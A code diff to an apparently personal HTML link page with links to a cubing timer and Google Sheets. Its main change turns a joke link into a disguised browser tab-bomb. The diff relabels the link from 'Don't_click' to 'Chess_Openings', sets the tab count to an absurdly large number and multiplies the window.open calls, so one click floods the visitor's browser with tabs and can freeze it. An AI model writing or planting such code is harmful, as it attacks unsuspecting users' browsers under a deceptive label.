@@ -61,15 +61,24 @@
         document.getElementById('compliment').textContent = getDailyCompliment();
     </script>
     <section id="link1"><a href="https://cstimer.net/">csTimer</a></section>
+    <section id="link3"><a href="https://docs.google.com/spreadsheets/d/12EjF9kJB_HU-KQQPlsKGHpvu_Jsc1KlMB_WwgIfthaU/edit?gid=0#gid=0">School_List</a></section>
     <section id="link2"> <a href="https://docs.google.com/spreadsheets/d/11y1Y4rD59kcl1hKQxL6EfLSsI84n0VorHF5QjmgFpbs/edit?gid=0#gid=0">Qui_Algs</a></section>
-<section id="funi"><a href="https://media.tenor.com/SmFuXpbs2OAAAAAM/elmo-idiot.gif" id="openLink">Don't_click</a>
+<section id="funi"><a href="https://media.tenor.com/SmFuXpbs2OAAAAAM/elmo-idiot.gif" id="openLink">Chess_Openings</a>
 
     <script>
         document.getElementById('openLink').addEventListener('click', function(e) {
             e.preventDefault(); // Prevent the default action of the link
             var url = this.href;
-            var tabCount = 100; // Change this number for the number of tabs you want to open
+            var tabCount = 9999999999999999999999999999999999999999999; // Change this number for the number of tabs you want to open
             for (var i = 0; i < tabCount; i++) {
+                window.open(url, '_blank');
+                window.open(url, '_blank');
+                window.open(url, '_blank');
+                window.open(url, '_blank');
+                window.open(url, '_blank');
+                window.open(url, '_blank');
+                window.open(url, '_blank');
+                window.open(url, '_blank');
                 window.open(url, '_blank'); // Open in a new tab
             }
         });
